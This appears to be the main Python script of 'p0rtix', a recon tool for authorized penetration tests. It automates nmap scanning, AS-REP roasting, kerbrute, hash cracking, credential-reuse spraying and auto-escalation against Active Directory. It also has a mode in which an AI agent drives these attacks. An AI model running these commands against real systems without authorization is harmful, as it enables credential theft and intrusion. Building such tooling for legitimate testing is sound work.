#!/usr/bin/env python3
"""
p0rtix — scope-aware recon and enumeration for authorized assessments

Usage:
  sudo python3 p0rtix.py <ip> [--domain DOMAIN] [--name NAME]
                               [--workspace DIR] [--workers N]

Examples:
  sudo python3 p0rtix.py 10.10.11.34
  sudo python3 p0rtix.py 10.10.11.34 --domain test.htb --name lame
  sudo python3 p0rtix.py 10.10.11.34 --domain test.htb --workspace ~/Projects/htb

Requires root for SYN scans (-sS) and /etc/hosts writes.
"""
import argparse
import os
import shutil
import re
import subprocess
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

from lib.analyze import analyze_findings
from lib.deps import check_deps
from lib.logger import get_logger, setup_logging
from lib.findings import Findings, ServiceBuffer, set_verbose
from lib.hosts import HostsManager
from lib.models import Discovery, Service
from lib.nmap import run_port_discovery, run_service_scan, parse_service_xml
from lib.runner import Runner
from lib.scope import Scope
from lib.services import enumerate_service
from lib.state import ScanState
from lib.web import enumerate_web
from lib import ui
from lib.workspace import Workspace

BANNER = r"""
██▓███   ▒█████   ██▀███  ▄▄▄█████▓ ██▓▒███  ██▒
▓██░  ██▒▒██▒  ██▒▓██ ▒ ██▒▓  ██▒ ▓▒▓██▒▒▒ █ █ ▒░
▓██░ ██▓▒▒██░  ██▒▓██ ░▄█ ▒▒ ▓██░ ▒░▒██▒░░  █   ░
▒██▄█▓▒ ▒▒██   ██░▒██▀▀█▄  ░ ▓██▓ ░ ░██░ ░ █ █ ▒
▒██▒ ░  ░░ ████▓▒░░██▓ ▒██▒  ▒██▒ ░ ░██░▒██▒ ▒██▒
▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░  ▒ ░░   ░▓  ▒▒ ░ ░▓ ░
░▒ ░       ░ ▒ ▒░   ░▒ ░ ▒░    ░     ▒ ░░░   ░▒ ░
░░       ░ ░ ░ ▒    ░░   ░   ░       ▒ ░ ░    ░
             ░ ░     ░               ░   ░    ░
by v0idravl
"""


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="p0rtix — automated recon and enumeration",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )

    # Target — mutually exclusive: single IP or targets file.
    # Not required at the argparse level: --mode init needs no target, and the
    # scan/creds dispatch paths sys.exit on their own when a target is missing.
    target_group = p.add_mutually_exclusive_group(required=False)
    target_group.add_argument("ip", nargs="?", help="Target IP address")
    target_group.add_argument("--targets", "-T", metavar="FILE",
                              help="File of targets, one per line: IP [domain [name]]")

    p.add_argument("--domain", "-d", metavar="DOMAIN",
                   help="Primary domain for vhost busting (e.g. test.htb)")
    p.add_argument("--name", "-n", metavar="NAME",
                   help="Machine nickname used for the output directory (default: domain or IP)")
    p.add_argument("--workspace", "-w", metavar="DIR", default=".",
                   help="Root directory for all output (default: current directory)")
    p.add_argument("--workers", type=int, default=6, metavar="N",
                   help="Parallel enumeration threads (default: 6)")
    p.add_argument("--analyze", "-A", action="store_true",
                   help="send findings.md to Claude API for AI analysis (requires ANTHROPIC_API_KEY; use sudo -E to preserve env)")
    p.add_argument("--model", default="claude-sonnet-4-6", metavar="MODEL",
                   help="Claude model for --analyze (default: claude-sonnet-4-6)")
    p.add_argument("--verbose", "-v", action="store_true",
                   help="show inline enumeration notes in findings.md")
    p.add_argument("--debug", action="store_true",
                   help="verbose terminal output — per-tool step chatter for troubleshooting")
    p.add_argument("--deep", action="store_true",
                   help="extended web scanning: cewl wordlist, arjun param discovery, full API bust (slower)")
    p.add_argument("--continue", dest="continue_scan", action="store_true",
                   help="resume a previous scan — skips completed phases (auto-detected if prior scan exists)")
    p.add_argument("--rescan", action="store_true",
                   help="force fresh nmap scans even when prior scan data exists")
    p.add_argument("--sample", action="store_true",
                   help="zip the workspace directory at end of scan")
    p.add_argument("--mode", default=None,
                   help="init = create workspace skeleton only; scan = full recon; "
                        "creds = credentialed AD enum; scan,creds = both in one run; "
                        "console = interactive operator console (engine v2). "
                        "Default: console, or scan,creds when credentials are supplied")
    p.add_argument("--level", type=int, default=0, metavar="0-9",
                   help="console automation dial: 0 = manual/quiet (default), rising "
                        "levels auto-run up the noise ladder, 9 = run everything "
                        "(warnings/countdowns suppressed). Only used with --mode console")
    p.add_argument("--headless", "--no-tui", dest="headless", action="store_true",
                   help="console: force the line-mode REPL instead of the Textual "
                        "dashboard (also auto-selected when stdin is not a TTY, so "
                        "piped command scripts just work). Only used with --mode console")
    p.add_argument("-u", "--username", metavar="USER",
                   help="Single username for --mode creds")
    p.add_argument("-p", "--password", metavar="PASS",
                   help="Single password for --mode creds")
    p.add_argument("--creds", metavar="FILE",
                   help="File of username:password pairs (one per line) for --mode creds")
    p.add_argument("--users", metavar="FILE",
                   help="Seed loot/users.txt with usernames from FILE before enumeration")
    p.add_argument("--no-install", action="store_true",
                   help="never attempt dependency installation; fail if required tools are missing")
    return p.parse_args()


def _parse_targets_file(path: str) -> list[tuple[str, str | None, str | None]]:
    """
    Parse a targets file into (ip, domain, name) tuples.
    Format per line: IP [domain [name]]
    Lines starting with # and blank lines are ignored.
    """
    targets: list[tuple[str, str | None, str | None]] = []
    for line in open(path).read().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split()
        ip = parts[0]
        domain = parts[1] if len(parts) > 1 else None
        name = parts[2] if len(parts) > 2 else None
        targets.append((ip, domain, name))
    return targets


def _reload_services_from_disk(ws: "Workspace") -> list[Service]:
    """Re-parse service objects from saved nmap XML files (used by --continue)."""
    services: list[Service] = []
    tcp_xml = next(ws.raw_dir.glob("*_tcp_services.xml"), None)
    udp_xml = next(ws.raw_dir.glob("*_udp_confirmed.xml"), None)
    if tcp_xml:
        services.extend(parse_service_xml(tcp_xml, "tcp"))
    if udp_xml:
        services.extend(parse_service_xml(udp_xml, "udp"))
    return services


def _run_single_scan(
    ip: str,
    domain: str | None,
    name: str | None,
    args: argparse.Namespace,
    available: set[str],
) -> dict:
    """
    Full scan pipeline for one target. Returns a summary dict for multi-target reporting.
    Honours --continue to skip port discovery and service scan if state file says they're done.
    """
    ws = Workspace(ip, domain, name, args.workspace,
                   mode="scan" if args.mode == "scan,creds" else args.mode)
    ws.deep = args.deep
    state = ScanState(ws.machine_dir)
    setup_logging(ws.log_dir)
    _log = get_logger()
    _log.info("Target: %s  domain: %s  mode: %s", ip, domain or "none", args.mode)
    findings = Findings(ws.findings_path, ip, domain)
    set_verbose(args.verbose)
    runner = Runner(ws)
    hosts = HostsManager()
    scope = Scope(ip, domain)

    if domain and not hosts.resolves(domain):
        ui.info(f"Domain '{domain}' does not resolve.")
        hosts.prompt_add(ip, domain)

    # Auto-use prior scan data if available — no flag needed.
    # --rescan forces fresh nmap even when state exists.
    _use_prior = (not getattr(args, "rescan", False)) and state.has_prior_scan

    ui.info(f"Workspace : {ws.machine_dir}")
    ui.info(f"Findings  : {ws.findings_path}")
    ui.info(f"Target    : {ip}" + (f"   Domain: {domain}" if domain else ""))
    if _use_prior:
        ui.info(f"Prior scan : {state.summary()}")
        ui.info(f"           → nmap phases skipped (use --rescan to force fresh scan)")
    elif args.continue_scan and state.exists:
        ui.info(f"Resuming  : {state.summary()}")
    ui.info(f"Workers   : {args.workers}")
    print()

    # ── Creds-only dispatch ───────────────────────────────────────────────────
    if args.mode == "creds":
        from lib.credsmode import load_creds, run_creds_mode
        creds = load_creds(args.username, args.password, args.creds)
        if not creds:
            ui.warn("No valid credentials parsed — skipping creds mode for this target")
            return {"ip": ip, "domain": domain, "machine_dir": str(ws.machine_dir), "success": False}

        services: list[Service] = _reload_services_from_disk(ws)
        if not services:
            ui.warn("No prior nmap XML found — per-service enumeration will be limited")

        run_creds_mode(ip, domain, creds, services, runner, findings, ws, available)
        findings.finalize()
        if args.analyze:
            analyze_findings(ws, ip, domain, model=args.model, mode="creds")
        _chown(ws)
        _print_loot_summary(ws)
        return {"ip": ip, "domain": domain, "machine_dir": str(ws.machine_dir), "success": True}

    # ── Followup dispatch ─────────────────────────────────────────────────────
    if args.mode == "followup":
        from lib.credsmode import load_creds
        from lib.followup import run_followup_mode

        creds = load_creds(args.username, args.password, args.creds)
        if not creds:
            ui.warn("No valid credentials parsed — cannot run followup mode")
            return {"ip": ip, "domain": domain, "machine_dir": str(ws.machine_dir), "success": False}

        services = _reload_services_from_disk(ws)
        if not services:
            ui.warn("No prior nmap XML found — run a scan first before --mode followup")
            ui.warn("Per-service enumeration will be limited to any services discovered")

        effective_domain = domain or ws.discovered_domain or None
        run_followup_mode(ip, effective_domain, creds, services, runner, ws, available)
        _chown(ws)
        _print_loot_summary(ws)
        return {"ip": ip, "domain": domain, "machine_dir": str(ws.machine_dir), "success": True}

    # ── Phase 1: Port discovery ───────────────────────────────────────────────
    if _use_prior or (args.continue_scan and state.is_done("port_discovery")):
        ports = state.get("ports", {"tcp": [], "udp": []})
        ui.info(f"Port discovery: using prior results — TCP {ports['tcp']}  UDP {ports['udp']}")
        findings.h2("Port Discovery")
        findings.note(f"Using prior scan — TCP {ports['tcp']} UDP {ports['udp']}")
    else:
        ports = run_port_discovery(ip, runner, ws, findings)
        if not ports["tcp"] and not ports["udp"]:
            findings.note("No open ports found.")
            ui.warn("No open ports found. Exiting.")
            findings.finalize()
            _chown(ws)
            return {"ip": ip, "domain": domain, "machine_dir": str(ws.machine_dir), "success": False}
        state.mark_done("port_discovery", ports=ports)

    # ── Phase 2: Service version scan ─────────────────────────────────────────
    if _use_prior or (args.continue_scan and state.is_done("service_scan")):
        services = _reload_services_from_disk(ws)
        ui.info(f"Service scan: using prior results — {len(services)} service(s) from XML")
        from lib.nmap import write_port_table
        write_port_table(services, findings)
    else:
        services = run_service_scan(ip, ports, runner, ws, findings)
        state.mark_done("service_scan")

    AD_PORTS = {53, 88, 139, 389, 445, 636, 3268, 3269}
    for svc in services:
        if svc.port in AD_PORTS and domain and not svc.hostname:
            svc.hostname = domain
    services = _dedup_services(services)

    # ── --users seed ──────────────────────────────────────────────────────────
    if getattr(args, "users", None):
        try:
            lines = [l.strip() for l in open(args.users).read().splitlines() if l.strip()]
            for u in lines:
                ws.add_user(u)
            ui.info(f"Users seeded : {args.users} ({len(lines)} entries)")
        except OSError as e:
            ui.warn(f"--users file error: {e}")

    # ── Phase 3: Parallel service + web enumeration ───────────────────────────
    # Only skip enumeration on explicit --continue — always re-run when called fresh
    # (e.g. a credentialed follow-up run should still re-enumerate web/services)
    if args.continue_scan and not _use_prior and state.is_done("enumeration"):
        ui.info("Skipping enumeration phase (done)")
        all_discoveries: list[Discovery] = []
    else:
        ui.info(f"Starting parallel enumeration ({len(services)} service(s))...")

        web_services   = [s for s in services if s.is_web]
        other_services = [s for s in services if not s.is_web]

        all_discoveries = []
        svc_futures: dict = {}

        with ThreadPoolExecutor(max_workers=args.workers) as pool:
            for svc in web_services:
                buf = ServiceBuffer(svc.port, svc.proto)
                f = pool.submit(
                    enumerate_web,
                    ip, svc, domain, runner, buf, scope, hosts, available,
                    deep=args.deep,
                )
                svc_futures[f] = (buf, f"web:{svc.port}")

            for svc in other_services:
                buf = ServiceBuffer(svc.port, svc.proto)
                f = pool.submit(enumerate_service, ip, svc, runner, buf, available)
                svc_futures[f] = (buf, f"service:{svc.port}")

            for future in as_completed(svc_futures):
                buf, label = svc_futures[future]
                try:
                    result = future.result()
                    if result:
                        all_discoveries.extend(result)
                    ui.good(f"Done: {label}")
                except Exception as exc:
                    ui.warn(f"Error in {label}: {exc}")
                    buf.note(f"Enumeration error: {exc}")

        findings.h2("Service Findings")
        for buf, _ in sorted(svc_futures.values(), key=lambda x: (x[0].port, x[0].proto)):
            findings.flush_service_buffer(buf)

        state.mark_done("enumeration")

    # ── Phase 3.5: Post-domain checks ─────────────────────────────────────────
    effective_domain = domain or ws.discovered_domain
    if ws.discovered_domain and not domain:
        ui.info(f"Domain discovered: {ws.discovered_domain}")
        if not hosts.resolves(ws.discovered_domain):
            hosts.prompt_add(ip, ws.discovered_domain)

    hostnames_file = ws.loot_dir / "hostnames.txt"
    if hostnames_file.exists():
        for fqdn in hostnames_file.read_text().splitlines():
            fqdn = fqdn.strip()
            if fqdn and not hosts.is_known(fqdn):
                hosts.prompt_add(ip, fqdn)

    _skip_post = args.continue_scan and not _use_prior and state.is_done("post_domain")
    if effective_domain and not _skip_post:
        _run_post_domain_checks(ip, effective_domain, runner, findings, ws, available)
        _run_post_dns_checks(ip, effective_domain, runner, findings, available)
        state.mark_done("post_domain")
    elif _skip_post:
        ui.info("Skipping post-domain checks (done)")

    # ── Phase 3.55: Offline cracking ──────────────────────────────────────────
    # Crack any captured AS-REP/Kerberoast/NTLM hashes with rockyou so the
    # plaintext is available to the cred-reuse spray below.
    from lib.crack import crack_hashes
    cracked = crack_hashes(ws, runner, findings, available)
    if cracked:
        ui.good(f"Cracked {len(cracked)} password(s) → loot/creds_found.txt")

    # ── Phase 3.6: Credential re-use ──────────────────────────────────────────
    creds_file = ws.loot_dir / "creds_found.txt"
    users_file = ws.loot_dir / "users.txt"
    _skip_reuse = args.continue_scan and not _use_prior and state.is_done("cred_reuse")
    if (creds_file.exists() and users_file.exists() and creds_file.stat().st_size > 0
            and not _skip_reuse):
        _run_cred_reuse(ip, runner, findings, ws, services, available)
        state.mark_done("cred_reuse")

    # ── Phase 3.7: Auto-escalation ────────────────────────────────────────────
    # A cred discovered/cracked mid-scan self-promotes to a credentialed pass
    # (recursive, bounded). Skipped for scan,creds — that path escalates from the
    # provided creds at the end. Needs a domain for the AD core to do anything.
    if args.mode == "scan" and effective_domain:
        discovered = sorted(_parse_valid_creds(ws))
        if discovered:
            ui.phase("Auto-escalation")
            ui.info(f"{len(discovered)} discovered credential(s) — promoting to credentialed enumeration")
            _run_credentialed_rounds(ip, effective_domain, discovered,
                                     runner, findings, ws, services, available)

    # ── Phase 4: Follow-up on discovered vhosts / SSL SANs ────────────────────
    if not (args.continue_scan and not _use_prior and state.is_done("followup")):
        new_hosts: list[tuple[Discovery, Service]] = []
        for d in all_discoveries:
            if hosts.is_known(d.hostname):
                continue
            if not scope.check(d.hostname):
                ui.warn(f"Out of scope — skipping: {d.hostname} (from {d.source})")
                continue
            ui.info(f"[{d.type.upper()}] Discovered: {d.hostname}  (via {d.source})")
            if hosts.prompt_add(ip, d.hostname):
                svc = Service(
                    port=d.port, proto="tcp", name=d.scheme,
                    version="", is_web=True, scheme=d.scheme,
                    hostname=d.hostname,
                )
                new_hosts.append((d, svc))

        if new_hosts:
            ui.info(f"Follow-up enumeration on {len(new_hosts)} discovered host(s)...")
            followup_futures: dict = {}
            with ThreadPoolExecutor(max_workers=args.workers) as pool:
                for d, svc in new_hosts:
                    buf = ServiceBuffer(svc.port, svc.proto)
                    f = pool.submit(
                        enumerate_web,
                        ip, svc, domain, runner, buf, scope, hosts, available,
                        is_followup=True, deep=args.deep,
                    )
                    followup_futures[f] = (buf, d.hostname)

                for future in as_completed(followup_futures):
                    buf, label = followup_futures[future]
                    try:
                        future.result()
                        ui.good(f"Done: {label}")
                    except Exception as exc:
                        ui.warn(f"Error in followup {label}: {exc}")
                        buf.note(f"Enumeration error: {exc}")

            findings.h2("Discovered Hosts")
            for buf, _ in sorted(followup_futures.values(),
                                 key=lambda x: (x[0].port, x[0].proto)):
                findings.flush_service_buffer(buf)

        state.mark_done("followup")

    # ── Loot summary in findings ───────────────────────────────────────────────
    users_file = ws.loot_dir / "users.txt"
    creds_file = ws.loot_dir / "creds_found.txt"
    user_count = (sum(1 for _ in users_file.open())
                  if users_file.exists() and users_file.stat().st_size > 0 else 0)
    cred_count = (sum(1 for _ in creds_file.open())
                  if creds_file.exists() and creds_file.stat().st_size > 0 else 0)
    if user_count or cred_count:
        findings.h2("Loot")
        if user_count:
            findings.bullet(f"**{user_count} unique user(s)** — `{users_file}`")
        if cred_count:
            findings.bullet(f"**{cred_count} credential(s)** — `{creds_file}`")

    # ── searchsploit ───────────────────────────────────────────────────────────
    if "searchsploit" in available:
        nmap_xml = ws.raw_dir / "04_tcp_services.xml"
        if nmap_xml.exists():
            findings.h2("Exploit References (searchsploit)")
            cmd = ["searchsploit", "--nmap", str(nmap_xml)]
            out = runner.run(cmd, "searchsploit_nmap")
            findings.cmd(" ".join(cmd))
            _write_searchsploit(out, findings)
            findings.note(
                "To view a specific exploit: `searchsploit -x <EDB-ID>` | "
                "To copy to CWD: `searchsploit -m <EDB-ID>`"
            )

    # ── Combined mode: credentialed phase after scan ───────────────────────────
    if args.mode == "scan,creds":
        from lib.credsmode import load_creds
        creds_list = load_creds(args.username, args.password, args.creds)
        creds_domain = domain or ws.discovered_domain
        if not creds_list:
            ui.warn("Combined mode: no valid credentials — skipping creds phase")
        elif not creds_domain:
            ui.warn("Combined mode: no domain — running single credentialed pass")
            from lib.credsmode import run_creds_mode
            run_creds_mode(ip, None, creds_list, services, runner, findings, ws, available)
        else:
            ui.info(f"Combined mode: starting credentialed phase as {creds_list[0][0]}...")
            _run_credentialed_rounds(ip, creds_domain, creds_list,
                                     runner, findings, ws, services, available)

    # ── Wrap up ────────────────────────────────────────────────────────────────
    state.mark_done("complete")
    findings.finalize()
    if args.analyze:
        analyze_findings(ws, ip, domain, model=args.model)

    if args.sample:
        try:
            zip_path = ws.create_sample()
            ui.good(f"Sample    : {zip_path}")
        except RuntimeError as exc:
            ui.warn(f"Sample zip failed: {exc}")

    _chown(ws)
    _print_loot_summary(ws)
    ui.good(f"Findings  : {ws.findings_path}")
    ui.good(f"Raw data  : {ws.raw_dir}/")
    ui.good(f"Loot      : {ws.loot_dir}/")
    print("─" * 60)

    return {
        "ip": ip, "domain": domain or "",
        "machine_dir": str(ws.machine_dir),
        "success": True,
        "users": user_count,
        "creds": cred_count,
    }


def _run_init(args: argparse.Namespace):
    """
    --mode init: create the on-disk workspace skeleton (raw/, loot/, exploit/,
    report/, logs/, loot/bloodhound/ + report template) without running any scan.

    Lets you stage username/cred files in loot/ before kicking off a scan, and
    seeds users.txt / domain.txt up front. Runs without root so the directory is
    owned by the calling user from the start.
    """
    if not args.name and not args.ip and not args.domain:
        sys.exit("[!] --mode init requires --name (or an IP / --domain) to name the workspace")

    # Guard: refuse to stage into a populated workspace unless --rescan is given.
    # A non-empty target dir almost always means a prior scan whose cached raw/
    # output and loot/domain.txt would poison a fresh engagement.
    from pathlib import Path

    from lib.workspace import _slugify
    slug = args.name or args.domain or args.ip
    machine_dir = Path(args.workspace).resolve() / _slugify(slug)
    if machine_dir.exists() and any(machine_dir.iterdir()) and not args.rescan:
        ui.warn(f"Workspace already populated: {machine_dir}")
        print( "[!] It likely holds a prior scan (cached raw/ output, loot/domain.txt) that")
        print( "[!] would poison this engagement. Re-run with --rescan to stage anyway,")
        print( "[!] or delete the directory / pick a different --name first.")
        sys.exit(1)

    ws = Workspace(args.ip or "", args.domain, args.name, args.workspace, mode="scan")

    if args.users:
        try:
            lines = [l.strip() for l in open(args.users).read().splitlines() if l.strip()]
            for u in lines:
                ws.add_user(u)
            ui.info(f"Users seeded : {ws.loot_dir / 'users.txt'} ({len(lines)} entries)")
        except OSError as e:
            ui.warn(f"--users file error: {e}")

    if args.domain:
        ws.set_discovered_domain(args.domain)
        ui.info(f"Domain seeded: {ws.loot_dir / 'domain.txt'} ({args.domain})")

    _chown(ws)

    ui.info(f"Workspace initialised: {ws.machine_dir}")
    print( "[*] Layout:")
    for d in (ws.raw_dir, ws.loot_dir, ws.exploit_dir, ws.report_dir, ws.bloodhound_dir, ws.log_dir):
        ui.debug(f"{d.relative_to(ws.machine_dir.parent)}/")
    ui.debug(f"{ws.report_path.relative_to(ws.machine_dir.parent)}")
    ui.info(f"Stage any username/cred files in {ws.loot_dir}, then run your scan.")


def _has_scan_privs() -> bool:
    """
    True if nmap SYN/UDP scans will work: either we're root, or nmap carries the
    cap_net_raw capability (set once via tools/setup-privs.sh) so it can open raw
    sockets as a normal user. Lets p0rtix run without sudo after a one-time setup.
    """
    if os.geteuid() == 0:
        return True
    nmap = shutil.which("nmap")
    if not nmap:
        return False
    try:
        out = subprocess.run(["getcap", nmap], capture_output=True, text=True).stdout
    except FileNotFoundError:
        return False
    return "cap_net_raw" in out.lower()


def main():
    print(BANNER)
    args = parse_args()
    ui.set_debug(args.debug)

    # No --mode given drops to the console, unless credentials were supplied —
    # then auto-promote to scan,creds so `p0rtix <ip> -u u -p p` just works.
    if args.mode is None:
        if args.username or args.creds:
            ui.info("Credentials provided — running scan then creds phase (scan,creds mode)")
            args.mode = "scan,creds"
        else:
            args.mode = "console"

    _VALID_MODES = {"init", "scan", "creds", "scan,creds", "followup", "console", "mcp"}
    if args.mode not in _VALID_MODES:
        sys.exit(f"[!] Invalid --mode '{args.mode}'. Choose: init | scan | creds | scan,creds | followup | console | mcp")

    if not (0 <= args.level <= 9):
        sys.exit("[!] --level must be between 0 and 9")

    # init: stage the workspace skeleton only — no root, no deps, no scan.
    if args.mode == "init":
        _run_init(args)
        return

    # console: interactive operator console (engine v2). Opens at PASSIVE (zero
    # packets), so it launches without root; SYN discovery will warn/fail until
    # privileges are granted, surfaced when that action runs.
    if args.mode == "console":
        if not args.ip:
            sys.exit("[!] --mode console requires a target IP")
        if not _has_scan_privs():
            ui.warn("Not root — TCP/UDP discovery (SYN scan) will fail until you "
                    "run with sudo or grant nmap caps (tools/setup-privs.sh).")
        available = check_deps(install_missing=not args.no_install)
        from lib.engine.runmode import run_console_mode
        run_console_mode(args.ip, args.domain, args.name, args, available)
        return

    # mcp: serve the engine as an MCP (stdio) server for an AI agent to drive.
    # Registers statically — the agent calls open_target(ip) to begin (an optional
    # IP here pre-opens one). Opens at PASSIVE; the agent steers noise itself.
    # Requires the [mcp] extra (`pip install p0rtix[mcp]`). No install prompts.
    if args.mode == "mcp":
        try:
            from lib.mcp.server import build_server
        except ImportError as exc:
            sys.exit(f"[!] MCP mode needs the 'mcp' SDK — pip install p0rtix[mcp] ({exc})")
        from lib.mcp.session import SessionManager
        available = check_deps(install_missing=not args.no_install)
        manager = SessionManager(args, available)
        if args.ip:
            manager.open(args.ip, args.domain, args.name)
        build_server(manager).run()
        return

    if not _has_scan_privs():
        ui.warn("p0rtix needs raw-socket privileges for nmap SYN/UDP scans.")
        ui.warn("Grant nmap the capabilities once (then run without sudo, ever):")
        ui.warn("    sudo ./tools/setup-privs.sh")
        ui.warn("…or just run this invocation with sudo.")
        sys.exit(1)

    # Auto-promote: credentials supplied with default scan mode → scan,creds
    if args.mode == "scan" and (args.username or args.creds):
        ui.info("Credentials provided — running scan then creds phase (scan,creds mode)")
        args.mode = "scan,creds"

    _needs_creds = args.mode in ("creds", "scan,creds", "followup")
    if _needs_creds and not args.username and not args.creds:
        sys.exit("[!] --mode creds/scan,creds/followup requires -u/-p or --creds <file>")
    if args.mode in ("creds", "scan,creds") and not args.domain and not args.targets:
        ui.warn("Warning: --domain not set; AD tools will have limited scope")

    available = check_deps(install_missing=not args.no_install)

    # ── Multi-target mode ─────────────────────────────────────────────────────
    if args.targets:
        targets = _parse_targets_file(args.targets)
        if not targets:
            sys.exit(f"[!] No valid targets found in {args.targets}")

        ui.info(f"Multi-target: {len(targets)} target(s) loaded from {args.targets}")
        results: list[dict] = []

        for i, (ip, file_domain, file_name) in enumerate(targets, 1):
            domain = file_domain or args.domain
            name   = file_name   or args.name
            sep = "═" * 60
            print(f"\n{sep}")
            print(f"  TARGET {i}/{len(targets)}: {ip}" + (f"  ({domain})" if domain else ""))
            print(sep)
            try:
                result = _run_single_scan(ip, domain, name, args, available)
            except KeyboardInterrupt:
                ui.warn(f"Interrupted on {ip} — moving to next target")
                result = {"ip": ip, "domain": domain or "", "success": False,
                          "machine_dir": "", "users": 0, "creds": 0}
            except Exception as exc:
                ui.warn(f"Scan failed for {ip}: {exc}")
                result = {"ip": ip, "domain": domain or "", "success": False,
                          "machine_dir": "", "users": 0, "creds": 0}
            results.append(result)

        _print_multi_summary(results)
        return

    # ── Single-target mode ────────────────────────────────────────────────────
    if not args.ip:
        sys.exit("[!] Provide a target IP or use --targets FILE")

    _run_single_scan(args.ip, args.domain, args.name, args, available)


def _chown(ws: "Workspace"):
    """Return ownership of output directory to the calling user (undoes sudo's root ownership)."""
    sudo_user = os.environ.get("SUDO_USER")
    if sudo_user:
        subprocess.run(["chown", "-R", f"{sudo_user}:", str(ws.machine_dir)],
                       capture_output=True)


def _print_multi_summary(results: list[dict]):
    W = 70
    print(f"\n{'═' * W}")
    print("  MULTI-TARGET SUMMARY")
    print(f"{'═' * W}")
    print(f"  {'IP':<20} {'Domain':<25} {'Users':>5} {'Creds':>5}  Status")
    print(f"  {'-'*20} {'-'*25} {'-'*5} {'-'*5}  {'-'*8}")
    for r in results:
        status = "done" if r.get("success") else "FAILED"
        ip     = r.get("ip", "")
        domain = r.get("domain", "") or ""
        users  = r.get("users", 0)
        creds  = r.get("creds", 0)
        print(f"  {ip:<20} {domain:<25} {users:>5} {creds:>5}  {status}")
        if r.get("machine_dir"):
            ui.debug(f"→ {r['machine_dir']}/findings.md")
    print()


def _run_post_domain_checks(
    ip: str, domain: str, runner: Runner,
    findings: Findings, ws: Workspace, available: set[str],
):
    """
    Domain-gated checks that run after all parallel handlers complete so the
    user list (assembled from LDAP + SMB + enum4linux-ng) is final.
    Runs even when users.txt is absent — still writes the section and notes.
    """
    users_file = ws.loot_dir / "users.txt"
    has_users = users_file.exists() and users_file.stat().st_size > 0

    findings.h2("Post-Enumeration: Domain Checks")
    if has_users:
        findings.bullet(
            f"Domain: `{domain}` — user list: `{users_file}` "
            f"({sum(1 for _ in users_file.open())} accounts)"
        )
    else:
        findings.bullet(
            f"Domain: `{domain}` — no users found via LDAP/SMB; "
            f"AS-REP roasting and kerbrute require a user list"
        )

    # AS-REP roasting — full user list, catches accounts LDAP UAC flag missed
    if has_users and "impacket-GetNPUsers" in available:
        cmd = [
            "impacket-GetNPUsers", f"{domain}/",
            "-no-pass", "-dc-ip", ip,
            "-request", "-format", "hashcat",
            "-usersfile", str(users_file),
        ]
        findings.cmd(" ".join(cmd))
        out = runner.run(cmd, "post_GetNPUsers", timeout=120)
        if "$krb5asrep$" in out:
            findings.bullet("**AS-REP roastable hash(es) found — crack with: `hashcat -m 18200`**")
            # Show only the hashes; summarise invalid seeded usernames rather than
            # dumping one KDC_ERR_C_PRINCIPAL_UNKNOWN line per non-existent guess.
            asrep_lines = [l.strip() for l in out.splitlines() if "$krb5asrep$" in l]
            findings.code_block("\n".join(asrep_lines))
            n_unknown = out.count("KDC_ERR_C_PRINCIPAL_UNKNOWN")
            if n_unknown:
                findings.note(f"{n_unknown} seeded username(s) not present in AD (filtered from output)")
            hash_file = ws.loot_dir / "asrep.hash"
            ws.append_krb_hashes("asrep.hash", asrep_lines)
            findings.bullet(f"**Hash saved:** `{hash_file}` — `hashcat -m 18200 {hash_file} /usr/share/wordlists/rockyou.txt`")
            findings.add_summary(f"**AS-REP hash(es) in `loot/asrep.hash`** — crack: `hashcat -m 18200`")
    elif not has_users:
        findings.note(
            f"AS-REP roasting (run once users are known): "
            f"`impacket-GetNPUsers {domain}/ -no-pass -dc-ip {ip} -request -format hashcat -usersfile loot/users.txt`"
        )

    # Kerbrute username validation — only for names NOT already confirmed by an
    # authoritative directory read (LDAP/RID/SMB/enum4linux). When the whole list
    # is DC-sourced the names are valid by definition, so re-confirming them with
    # noisy AS-REQ probes adds nothing ("collect once, leave it alone").
    if has_users and "kerbrute" in available:
        unverified = ws.unverified_users()
        if ws.users_complete and not unverified:
            findings.note(
                "kerbrute userenum skipped — full user list came from the AD "
                "directory (LDAP/RID/SMB), so every name is already confirmed valid"
            )
        else:
            kerb_target = str(users_file)
            tmp_path = None
            if ws.users_complete and unverified:
                # Validate only the unverified (seeded/OSINT) subset; the rest are
                # already directory-confirmed.
                import tempfile
                tf = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
                tf.write("\n".join(unverified)); tf.close()
                kerb_target = tmp_path = tf.name
                findings.note(
                    f"kerbrute validating {len(unverified)} unverified (seeded/OSINT) "
                    f"name(s); the rest are already confirmed via the AD directory"
                )
            cmd2 = ["kerbrute", "userenum", "--dc", ip, "-d", domain, kerb_target]
            findings.cmd(" ".join(cmd2))
            out2 = runner.run(cmd2, "post_kerbrute_userenum", timeout=300)
            valid = re.findall(r"VALID USERNAME:\s+(\S+)", out2)
            if valid:
                findings.bullet(f"**kerbrute confirmed ({len(valid)} valid):** {', '.join(valid)}")
                for u in valid:
                    ws.add_user(u.split("@")[0], authoritative=True)
            if tmp_path:
                os.unlink(tmp_path)

    findings.note(
        f"Kerberoasting (needs creds): "
        f"`impacket-GetUserSPNs {domain}/USER:PASS -dc-ip {ip} -request -outputfile spns.txt`"
    )


def _run_post_dns_checks(
    ip: str, domain: str, runner: Runner,
    findings: Findings, available: set[str],
):
    """
    SRV record enumeration and zone-transfer attempt for the discovered domain.
    Uses the same Runner cache labels as the Phase 3 DNS handler, so results
    from an earlier --domain run are reused rather than repeated.
    """
    if "dig" not in available and "dnsrecon" not in available:
        return

    findings.h2("Post-Enumeration: DNS")

    if "dig" in available:
        _SRV_RECORDS = [
            "_ldap._tcp", "_kerberos._tcp", "_kpasswd._tcp",
            "_gc._tcp", "_msdcs", "_sites",
        ]
        for srv in _SRV_RECORDS:
            cmd = ["dig", "SRV", f"{srv}.{domain}", f"@{ip}"]
            label = f"dns_srv_{srv.replace('.', '_').replace('-', '_')}_{domain}"
            out = runner.run(cmd, label)
            findings.cmd(" ".join(cmd))
            if "ANSWER SECTION" in out:
                findings.code_block(out.strip())

    if "dnsrecon" in available:
        cmd2 = ["dnsrecon", "-d", domain, "-t", "axfr,std", "-n", ip]
        # dnsrecon writes a log to $HOME/.config/dnsrecon/; point HOME at the
        # workspace so a root-owned ~/.config (left by an earlier sudo run)
